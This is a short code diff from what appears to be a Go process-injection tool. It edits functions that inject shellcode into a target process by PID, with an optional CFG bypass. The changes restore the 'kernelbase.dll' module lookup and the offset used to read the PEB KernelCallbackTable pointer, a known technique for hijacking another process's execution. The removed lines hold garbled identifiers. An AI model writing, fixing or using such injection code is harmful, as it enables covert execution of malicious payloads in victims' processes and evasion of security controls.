@@ -42,7 +42,7 @@ func executeOpusVariant1(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 	sb.WriteString("[+] Resolved handler list offsets dynamically\n")
 
 	// Step 3: Find target module in target process
-	kernelbaseAddr, err := findModuleInProcess(windows.Handle(hProcess), "target module")
+	kernelbaseAddr, err := findModuleInProcess(windows.Handle(hProcess), "kernelbase.dll")
 	if err != nil {
 		return sb.String(), fmt.Errorf("failed to find target module: %w", err)
 	}
@@ -197,7 +197,7 @@ func executeOpusVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 	sb.WriteString(fmt.Sprintf("[+] Target process block address: 0x%X\n", pbi.PebBaseAddress))
 
 	// Step 3: Read callback table pointer from process block+0x58
-	kernelCallbackTablePtrAddr := pbi.PebBaseAddress + process blockcallback tableOffset
+	kernelCallbackTablePtrAddr := pbi.PebBaseAddress + PEBKernelCallbackTableOffset
 	var kernelCallbackTable uintptr
 	err = injectReadMemoryInto(hProcess, kernelCallbackTablePtrAddr, unsafe.Pointer(&kernelCallbackTable), 8)
 	if err != nil {
